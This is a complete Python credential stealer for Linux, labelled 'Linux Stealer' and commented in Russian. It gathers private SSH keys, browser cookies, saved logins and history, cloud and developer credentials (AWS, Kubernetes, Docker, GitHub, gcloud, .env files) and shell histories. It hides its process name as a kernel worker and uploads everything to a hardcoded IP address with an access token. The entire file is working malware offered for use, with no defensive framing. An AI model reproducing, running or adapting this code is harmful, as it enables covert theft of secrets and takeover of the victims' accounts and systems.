#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Linux Stealer — сбор данных и отправка на сервер
"""

import os
import sys
import glob
import json
import base64
import hashlib
import platform
import subprocess
import tempfile
import shutil
import zipfile
import urllib.request
import urllib.parse
from datetime import datetime

# ================== НАСТРОЙКИ ==================
URL   = "http://93.152.212.127:8000/upload"
TOKEN = "H2YDEFZh79pJkTxAS_5LMWmn3i6QCP_nVseXnABpr5Y"
# ===============================================

HOME = os.path.expanduser("~")
DATA = {}          # собранные данные
FILES = {}         # файлы для отправки (имя -> содержимое)

def log(msg):
    print(f"[*] {msg}")

def safe_read(path, max_size=5 * 1024 * 1024):
    """Читает файл, если он не пустой и не слишком большой."""
    try:
        if not os.path.isfile(path):
            return None
        size = os.path.getsize(path)
        if size == 0 or size > max_size:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None

def add_file(name, path, max_size=5 * 1024 * 1024):
    content = safe_read(path, max_size)
    if content:
        FILES[name] = content

def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        return r.stdout.strip()
    except Exception:
        return ""

# ================== СИСТЕМНАЯ ИНФО ==================
def collect_system():
    info = {
        "os": platform.system(),
        "distro": run_cmd("cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'"),
        "kernel": platform.release(),
        "arch": platform.machine(),
        "hostname": platform.node(),
        "user": os.environ.get("USER", "unknown"),
        "uid": os.getuid(),
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "uptime": run_cmd("uptime -p"),
    }
    # IP
    info["ip"] = run_cmd("curl -s --max-time 5 ifconfig.me || curl -s --max-time 5 ipinfo.io/ip")
    # CPU
    info["cpu"] = run_cmd("lscpu | grep 'Model name' | head -1 | cut -d: -f2 | xargs")
    # RAM
    info["ram"] = run_cmd("free -h | grep Mem | awk '{print $2}'")
    DATA["system"] = info
    log("Системная информация собрана")

# ================== SSH КЛЮЧИ ==================
def collect_ssh():
    ssh_files = []
    paths = [
        os.path.join(HOME, ".ssh"),
        "/root/.ssh",
    ]
    for d in paths:
        if os.path.isdir(d):
            for f in glob.glob(os.path.join(d, "*")):
                if os.path.isfile(f) and not f.endswith(".pub"):
                    content = safe_read(f)
                    if content:
                        ssh_files.append({"path": f, "content": content.decode(errors="ignore")})
    if ssh_files:
        DATA["ssh_keys"] = ssh_files
        log(f"SSH ключей найдено: {len(ssh_files)}")

# ================== БРАУЗЕРЫ ==================
def collect_browser(browser, profile_dir, cookie_db, history_db, logins_db, downloads_csv=None):
    found = False
    profiles = glob.glob(os.path.join(HOME, profile_dir, "*/"))
    if not profiles:
        profiles = [os.path.join(HOME, profile_dir)]

    for prof in profiles:
        prof_name = os.path.basename(prof.rstrip("/")) or "default"
        prefix = f"{browser}_{prof_name}"

        # Cookies
        cookie_path = os.path.join(prof, cookie_db)
        if os.path.isfile(cookie_path):
            shutil.copy2(cookie_path, tempfile.mktemp(suffix=".db"))
            add_file(f"{prefix}_cookies.db", cookie_path)
            found = True

        # History
        hist_path = os.path.join(prof, history_db)
        if os.path.isfile(hist_path):
            add_file(f"{prefix}_history.db", hist_path)
            found = True

        # Logins (Login Data)
        login_path = os.path.join(prof, logins_db)
        if os.path.isfile(login_path):
            add_file(f"{prefix}_logins.db", login_path)
            found = True

        # Bookmarks
        bm_path = os.path.join(prof, "Bookmarks")
        if os.path.isfile(bm_path):
            add_file(f"{prefix}_bookmarks.json", bm_path)
            found = True

    if found:
        log(f"Данные браузера {browser} собраны")

def collect_browsers():
    # Chrome
    collect_browser("chrome", ".config/google-chrome", "Cookies", "History", "Login Data")
    # Chromium
    collect_browser("chromium", ".config/chromium", "Cookies", "History", "Login Data")
    # Firefox
    collect_browser("firefox", ".mozilla/firefox", "cookies.sqlite", "places.sqlite", "logins.json")
    # Brave
    collect_browser("brave", ".config/BraveSoftware/Brave-Browser", "Cookies", "History", "Login Data")
    # Edge
    collect_browser("edge", ".config/microsoft-edge", "Cookies", "History", "Login Data")

# ================== ПАРОЛИ В ФАЙЛАХ ==================
def collect_credentials():
    creds = {}

    # .netrc
    p = os.path.join(HOME, ".netrc")
    c = safe_read(p)
    if c:
        creds[".netrc"] = c.decode(errors="ignore")

    # .gitconfig
    p = os.path.join(HOME, ".gitconfig")
    c = safe_read(p)
    if c:
        creds[".gitconfig"] = c.decode(errors="ignore")

    # .env файлы
    for env_path in glob.glob(os.path.join(HOME, "**", ".env"), recursive=True)[:20]:
        c = safe_read(env_path, 1024 * 1024)
        if c:
            creds[os.path.basename(os.path.dirname(env_path)) + "_env"] = c.decode(errors="ignore")

    # .my.cnf (MySQL)
    p = os.path.join(HOME, ".my.cnf")
    c = safe_read(p)
    if c:
        creds[".my.cnf"] = c.decode(errors="ignore")

    # .pgpass (PostgreSQL)
    p = os.path.join(HOME, ".pgpass")
    c = safe_read(p)
    if c:
        creds[".pgpass"] = c.decode(errors="ignore")

    # .docker/config.json
    p = os.path.join(HOME, ".docker", "config.json")
    c = safe_read(p)
    if c:
        creds["docker_config"] = c.decode(errors="ignore")

    # .aws/credentials
    p = os.path.join(HOME, ".aws", "credentials")
    c = safe_read(p)
    if c:
        creds["aws_credentials"] = c.decode(errors="ignore")

    # .kube/config
    p = os.path.join(HOME, ".kube", "config")
    c = safe_read(p)
    if c:
        creds["kube_config"] = c.decode(errors="ignore")

    # .npmrc
    p = os.path.join(HOME, ".npmrc")
    c = safe_read(p)
    if c:
        creds[".npmrc"] = c.decode(errors="ignore")

    # .pip/pip.conf
    p = os.path.join(HOME, ".pip", "pip.conf")
    c = safe_read(p)
    if c:
        creds["pip_conf"] = c.decode(errors="ignore")

    # .htpasswd
    for htpass in glob.glob(os.path.join(HOME, "**", ".htpasswd"), recursive=True)[:10]:
        c = safe_read(htpass)
        if c:
            creds["htpasswd_" + str(len(creds))] = c.decode(errors="ignore")

    if creds:
        DATA["credentials"] = creds
        log(f"Файлов с паролями найдено: {len(creds)}")

# ================== ТОКЕНЫ / API KEYS ==================
def collect_tokens():
    tokens = {}

    # .bash_history / .zsh_history
    for hist in [".bash_history", ".zsh_history", ".fish_history"]:
        p = os.path.join(HOME, hist)
        c = safe_read(p, 2 * 1024 * 1024)
        if c:
            tokens[hist] = c.decode(errors="ignore")

    # .git-credentials
    p = os.path.join(HOME, ".git-credentials")
    c = safe_read(p)
    if c:
        tokens[".git-credentials"] = c.decode(errors="ignore")

    # .config/gcloud
    for f in glob.glob(os.path.join(HOME, ".config", "gcloud", "*")):
        if os.path.isfile(f):
            c = safe_read(f)
            if c:
                tokens["gcloud_" + os.path.basename(f)] = c.decode(errors="ignore")

    # .config/gh (GitHub CLI)
    p = os.path.join(HOME, ".config", "gh", "hosts.yml")
    c = safe_read(p)
    if c:
        tokens["gh_hosts"] = c.decode(errors="ignore")

    # .config/hub
    p = os.path.join(HOME, ".config", "hub")
    c = safe_read(p)
    if c:
        tokens["hub_config"] = c.decode(errors="ignore")

    # .token (VS Code)
    p = os.path.join(HOME, ".vscode-server", "data", "Machine", "machineid")
    c = safe_read(p)
    if c:
        tokens["vscode_machineid"] = c.decode(errors="ignore")

    if tokens:
        DATA["tokens"] = tokens
        log(f"Токенов/историй найдено: {len(tokens)}")

# ================== ПРОЦЕССЫ И СЕТЬ ==================
def collect_runtime():
    DATA["processes"] = run_cmd("ps aux --sort=-%mem | head -30")
    DATA["network"] = run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    DATA["routes"] = run_cmd("ip route")
    log("Процессы и сеть собраны")

# ================== ЗАЩИТА ==================
def hide_process():
    """Переименовывает процесс в /proc/self/comm."""
    try:
        with open("/proc/self/comm", "w") as f:
            f.write("kworker/0:1")
    except Exception:
        pass

# ================== ОТПРАВКА ==================
def send_data():
    """Отправляет все данные на сервер."""
    payload = {
        "token": TOKEN,
        "data": DATA,
        "files": {k: base64.b64encode(v).decode() for k, v in FILES.items()},
    }

    body = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        URL,
        data=body,
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {TOKEN}",
            "X-Token": TOKEN,
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            status = resp.status
            log(f"Отправлено! HTTP {status}")
            return True
    except Exception as e:
        log(f"Ошибка отправки: {e}")
        return False

# ================== MAIN ==================
def main():
    hide_process()
    log("=== Linux Stealer запущен ===")

    collect_system()
    collect_ssh()
    collect_browsers()
    collect_credentials()
    collect_tokens()
    collect_runtime()

    log(f"Всего файлов для отправки: {len(FILES)}")
    log(f"Категорий данных: {len(DATA)}")

    if send_data():
        log("Готово.")
    else:
        log("Не удалось отправить данные.")

if __name__ == "__main__":
    main()